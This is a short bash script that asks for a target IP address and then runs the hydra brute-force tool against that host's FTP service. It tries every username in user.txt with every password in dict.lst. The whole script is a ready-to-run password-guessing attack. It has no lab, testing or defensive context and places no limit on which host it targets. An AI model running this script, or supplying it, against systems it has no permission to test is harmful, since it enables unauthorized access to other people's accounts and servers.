#!/bin/bash
echo "enter your target ip:"
read ans
export user=user.txt
export pass=dict.lst
hydra -L $user -P $pass $ans ftp
